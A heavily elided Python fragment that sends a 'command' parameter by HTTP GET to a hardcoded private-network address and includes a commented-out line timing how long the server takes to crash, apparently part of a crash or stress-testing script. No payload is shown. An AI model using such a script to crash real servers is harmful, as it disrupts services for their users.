...
server_address = "http://192.168.155.29:8080/"
count = 0
...
def send_command(command):
    ...
    try:
        response = session.get(server_address, params={"command": command}, timeout=15)
        ...
        end_time = time.time()
        #print(f"Seconds taken to crash: {end_time - start_time:.2f} seconds")
